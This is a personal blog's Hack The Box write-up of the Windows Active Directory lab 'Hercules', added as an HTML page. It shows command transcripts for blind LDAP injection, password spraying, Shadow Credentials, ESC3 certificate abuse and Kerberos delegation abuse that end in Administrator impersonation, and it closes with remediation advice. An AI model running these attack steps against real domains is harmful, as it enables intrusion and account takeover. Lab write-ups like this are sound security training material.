@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts &#x60;johnathan.j&#x60;&#x27;s description — a live password. Spray into &#x60;ken.w&#x60;, coerce + crack to &#x60;natalie.a&#x60;, Shadow-Creds across &#x60;bob.w&#x60; → move &#x60;Auditor&#x60; between OUs → Shadow-Creds &#x60;auditor&#x60;. Forest Migration OU &#x60;GenericAll&#x60; + ESC3 Enrollment Agent → &#x60;ashley.b&#x60; → a scheduled &#x60;aCleanup.ps1&#x60; reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on &#x60;IIS_WEBSERVER$&#x60; (a user account, no SPNs) — swap NT hash for the TGT session key, run &#x60;S4U2Self+U2U+S4U2Proxy&#x60;, impersonate Administrator.">
+<title>HTB Hercules · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
+</head>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
+    </button>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
+
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-HERCULES</span></span>
+    <span class="wp-crumb-r">ENG#09 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 26.02.12</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-insane">INSANE</span>
+            <span class="wp-chip wp-chip-os os-windows">WINDOWS</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">AD</span><span class="wp-chip wp-chip-ghost tag-cycle-1">ADCS</span><span class="wp-chip wp-chip-ghost tag-cycle-2">KERBEROS</span>
+            <span class="wp-chip wp-chip-pts">80 PTS</span>
+          </div>
+          <h1 class="wp-title">HTB Hercules<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts `johnathan.j`'s description — a live password. Spray into `ken.w`, coerce + crack to `natalie.a`, Shadow-Creds across `bob.w` → move `Auditor` between OUs → Shadow-Creds `auditor`. Forest Migration OU `GenericAll` + ESC3 Enrollment Agent → `ashley.b` → a scheduled `aCleanup.ps1` reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on `IIS_WEBSERVER$` (a user account, no SPNs) — swap NT hash for the TGT session key, run `S4U2Self+U2U+S4U2Proxy`, impersonate Administrator.</p>
+        </div>
+      </div>
+    </div>
+
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>hercules.htb</dd></div>
+        <div><dt>REF</dt><dd>10.129.13.203</dd></div>
+        
+        
+        <div><dt>DURATION</dt><dd>13 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
+
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 6 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ROOT</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#ldapi">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">LDAPI</div>
+        <div class="kc-sub">double URL-encode %252A</div>
+        <div class="kc-tag kc-tag-warn">BLIND</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#spray">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">SPRAY</div>
+        <div class="kc-sub">description → ken.w</div>
+        <div class="kc-tag kc-tag-warn">NETEXEC</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#shadow">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">SHADOW</div>
+        <div class="kc-sub">natalie.a → bob.w → auditor</div>
+        <div class="kc-tag kc-tag-warn">CERTIPY</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#esc3">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">ESC3</div>
+        <div class="kc-sub">fernando.r agent → ashley.b</div>
+        <div class="kc-tag kc-tag-warn">ADCS</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#cleanup">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">CLEANUP</div>
+        <div class="kc-sub">aCleanup.ps1 → IIS_Administrator</div>
+        <div class="kc-tag kc-tag-warn">ACL</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#root">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.06</div>
+        <div class="kc-stage">ROOT</div>
+        <div class="kc-sub">Tiraniddo RBCD + U2U</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
+
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#ldapi" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">LDAPi</span>
+        </a>
+        <a href="#spray" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">SPRAY</span>
+        </a>
+        <a href="#shadow" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">SHADOW</span>
+        </a>
+        <a href="#esc3" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">ESC3</span>
+        </a>
+        <a href="#cleanup" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">CLEANUP</span>
+        </a>
+        <a href="#root" class="wp-toc-row" data-stage="06">
+          <span class="n">06</span>
+          <span class="t">ROOT</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="ldapi" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; LDAPi</div>
+<h2 class="wp-stage-title">Double URL-encode past the regex blacklist.</h2>
+<div class="wp-stage-body"><p>The <code>/Login</code> SSO page rejects <code>*</code>, <code>(</code>, <code>)</code>, <code>|</code>, <code>&amp;</code>, <code>=</code>, <code>\</code>, <code>&lt;</code>, <code>&gt;</code>. But <code>%</code> is allowed — and IIS cheerfully URL-decodes <span class="hl-warn">twice</span>. <code>%252A</code> slips through the regex, arrives at the app as <code>%2A</code>, decodes to <code>*</code>:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -sk &#39;https://hercules.htb/Login&#39; \
+    -d &#39;Username=%252A&amp;Password=test&#39;
+Login attempt failed.
+
+<p>$ curl -sk &#39;<a href="https://hercules.htb/Login&#39">https://hercules.htb/Login&amp;#39</a>; <br>    -d &#39;Username=johnathan.j&amp;Password=test&#39;
+Invalid login attempt.</code></pre></p>
+</div>
+Two different responses = a blind-LDAP oracle. "Login attempt failed" means the filter matched but password didn't; "Invalid login attempt" means the filter didn't match. Build a character-by-character extractor against the `description` attribute. The result:
+
+<pre><code>johnathan.j → description: [REDACTED]
+</code></pre>
+<p><span class="hl-red">That&amp;#39;s not a warning — it&amp;#39;s a password.</span></p>
+</div>
+</section>
+<section class="wp-stage" id="spray" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; SPRAY</div>
+<h2 class="wp-stage-title">Description → ken.w.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · netexec spray</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nxc smb dc.hercules.htb -u users.txt \
+    -p &#39;[REDACTED]&#39; -k --continue-on-success
+[+] hercules.htb\ken.w:[REDACTED]</code></pre>
+</div>
+Only NTLM-disabled Kerberos, so every subsequent tool needs `-k`. From ken.w, coerce authentication and crack the captured NetNTLMv2 — `natalie.a:[REDACTED]`.</div>
+</section>
+<section class="wp-stage" id="shadow" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; SHADOW</div>
+<h2 class="wp-stage-title">Shadow Credentials ladder — natalie → bob → auditor.</h2>
+<div class="wp-stage-body"><p>natalie.a&#39;s Web Support group has <code>GenericWrite</code> on Web Department. <code>certipy-ad shadow auto</code> writes <code>msDS-KeyCredentialLink</code> and authenticates via PKINIT:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · certipy · bob.w</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy-ad shadow auto -u natalie.a@hercules.htb -k \
+    -target dc.hercules.htb -account bob.w -dc-ip $IP
+[+] Saved bob.w.ccache
+[+] NT hash: [REDACTED]</code></pre>
+</div>
+bob.w has `WRITE` on Security + Web Department OUs. Drag `Auditor` across the fence:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ldap3 · move OU</span></div>
+<pre class="wp-term-body"><code class="language-python">conn.modify_dn(
+  &#39;CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb&#39;,
+  &#39;CN=Auditor&#39;,
+  new_superior=&#39;OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb&#39;
+)</code></pre>
+</div>
+Now natalie's OU-level `GenericWrite` reaches Auditor. Shadow Creds again:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · certipy · auditor</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy-ad shadow auto -u natalie.a@hercules.htb -k \
+    -dc-host dc.hercules.htb -account auditor
+[+] NT hash: [REDACTED]
+
+<p>$ export KRB5CCNAME=auditor.ccache
+$ evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S
+<em>Evil-WinRM</em> PS&gt; type C:\Users\auditor\Desktop\user.txt</code></pre></p>
+</div></div>
+</section>
+<section class="wp-stage" id="esc3" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; ESC3</div>
+<h2 class="wp-stage-title">GenericAll on Forest Migration OU → ESC3 → ashley.b.</h2>
+<div class="wp-stage-body"><p>Grant auditor + IT Support <code>GenericAll</code> on the Forest Migration OU:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · bloodyAD · kerberos</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll \
+    &quot;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; auditor
+$ bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll \
+    &quot;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; &quot;IT Support&quot;</code></pre>
+</div>
+Enable `fernando.r` by clearing the disabled bit in UAC, set a password, then run <span class="hl-warn">ESC3</span>: request an Enrollment Agent cert, then request an on-behalf-of cert for `ashley.b`:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · certipy · ESC3</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
+    -ca &#39;CA-HERCULES&#39; -template &#39;EnrollmentAgent&#39; -k -dcom
+
+<p>$ certipy-ad req -u <a href="mailto:FERNANDO.R@hercules.htb">FERNANDO.R@hercules.htb</a> -target dc.hercules.htb <br>    -ca &#39;CA-HERCULES&#39; -template &#39;UserSignature&#39; -k <br>    -pfx fernando.r.pfx -on-behalf-of &#39;hercules\ASHLEY.B&#39; -dcom</p>
+<p>$ certipy-ad auth -pfx ashley.b.pfx -dc-ip $IP -domain hercules.htb
+[+] ashley.b NT hash: [REDACTED]</code></pre></p>
+</div></div>
+</section>
+<section class="wp-stage" id="cleanup" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; CLEANUP</div>
+<h2 class="wp-stage-title">aCleanup.ps1 fires the ACL reflow → IIS_Administrator live.</h2>
+<div class="wp-stage-body"><p>ashley.b has a scheduled <code>aCleanup.ps1</code> on her desktop that triggers <code>Password Cleanup</code> — clears <code>adminCount</code> and <span class="hl-warn">re-enables ACL inheritance</span> across flagged admin objects. After that sweep, IT Support&#39;s <code>GenericAll</code> on the Forest Migration OU cascades down to <code>IIS_Administrator</code>:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ashley.b@hercules</span></div>
+<pre class="wp-term-body"><code class="language-powershell">PS C:\Users\ashley.b\Desktop&gt; .\aCleanup.ps1
+PS&gt; Start-Sleep -Seconds 30
+PS&gt; Enable-ADAccount -Identity IIS_Administrator
+PS&gt; Set-ADAccountPassword -Identity IIS_Administrator `
+      -NewPassword (ConvertTo-SecureString &quot;[REDACTED]&quot; -AsPlainText -Force) `
+      -Reset</code></pre>
+</div></div>
+</section>
+<section class="wp-stage" id="root" data-stage="06">
+<div class="wp-stage-lbl"># STG.06 &middot; ROOT</div>
+<h2 class="wp-stage-title">Tiraniddo RBCD — session-key swap on a non-computer account.</h2>
+<div class="wp-stage-body"><p><code>IIS_WEBSERVER$</code> is a <span class="hl-red">user</span> (not a computer), has no SPNs, and lacks <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>. Standard RBCD <code>S4U2Proxy</code> fails. The Tiraniddo trick: request a TGT for the account, yank its session key, then <span class="hl-warn">set the account&amp;#39;s NT hash to equal that session key</span>. Now <code>S4U2Self+U2U+S4U2Proxy</code> succeeds.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · impacket · Tiraniddo</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD ... set password &#39;IIS_webserver$&#39; &#39;[REDACTED]&#39;
+
+<p>$ getTGT.py &#39;hercules.htb/IIS_WEBSERVER$&#39; -hashes :$NT_HASH -dc-ip $IP</p>
+<p>$ SESSION_KEY=$(describeTicket.py IIS_WEBSERVER$.ccache <br>    | grep &#39;Ticket Session Key&#39; | awk &#39;{print $NF}&#39;)</p>
+<p>$ changepasswd.py -newhashes &quot;:$SESSION_KEY&quot; <br>    &quot;hercules.htb/IIS_WEBSERVER$:[REDACTED]@dc.hercules.htb&quot; -k</p>
+<p>$ getST.py -u2u -impersonate Administrator <br>    -spn &quot;cifs/dc.hercules.htb&quot; -k -no-pass <br>    hercules.htb/IIS_WEBSERVER$ -dc-ip $IP</code></pre></p>
+</div>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · root</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+$ wmiexec.py -k -no-pass hercules.htb/Administrator@dc.hercules.htb \
+    &#39;cmd /c type C:\Users\Admin\Desktop\root.txt&#39;
+&lt;root flag&gt;</code></pre>
+</div>
+<aside class="wp-opsec"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-opsec-head"># OPSEC NOTE</div><div class="wp-opsec-body"><p>Six separate ACL or Kerberos weaknesses, each ordinary on its own — LDAP input reflection, password in description, Shadow Creds, OU move, ESC3, inheritance reflow, and finally a user-account RBCD. None are unusual in isolation. What makes Hercules insane is the scheduling: you need the cleanup script to run before IIS_Administrator&#39;s inheritance propagates, and the Tiraniddo session-key swap must precede any TGS request — if the TGT rolls you start over.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-airtouch-writeup.html">
+          <span class="l">&larr; ENG#08</span>
+          <span class="t">HTB AIRTOUCH</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 26.02.12</span>
+        <a class="wp-np next" href="htb-devarea-writeup.html">
+          <span class="l">ENG#10 &rarr;</span>
+          <span class="t">HTB DEVAREA</span>
+        </a>
+        
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">curl</span><span class="purp">ldapi</span></div>
+          <div class="wp-loadout-row"><span class="tool">netexec</span><span class="purp">spray</span></div>
+          <div class="wp-loadout-row"><span class="tool">certipy-ad</span><span class="purp">shadow + esc3</span></div>
+          <div class="wp-loadout-row"><span class="tool">bloodyAD</span><span class="purp">ace-flip</span></div>
+          <div class="wp-loadout-row"><span class="tool">impacket</span><span class="purp">kerberos</span></div>
+          <div class="wp-loadout-row"><span class="tool">evil-winrm</span><span class="purp">shell</span></div>
+        </div>
+      </div>
+
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Never echo LDAP search oracles to clients — a single bit of reflection is an exfil channel</li>
+          <li>Validate LDAP input server-side; regex blacklists are broken by double URL-encoding under IIS</li>
+          <li>Scope &#x60;GenericWrite&#x60; and &#x60;WriteAccountRestrictions&#x60; ACEs tightly; Shadow Credentials need only &#x60;msDS-KeyCredentialLink&#x60;</li>
+          <li>Disable ESC3 template enrollment for non-trusted issuance accounts</li>
+          <li>Audit ACL inheritance flips triggered by scheduled tasks</li>
+          <li>Enforce &#x60;TRUSTED_TO_AUTH_FOR_DELEGATION&#x60; and SPN requirements on RBCD-eligible accounts</li>
+        </ul>
+      </div>
+    </aside>
+
+  </div>
+
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
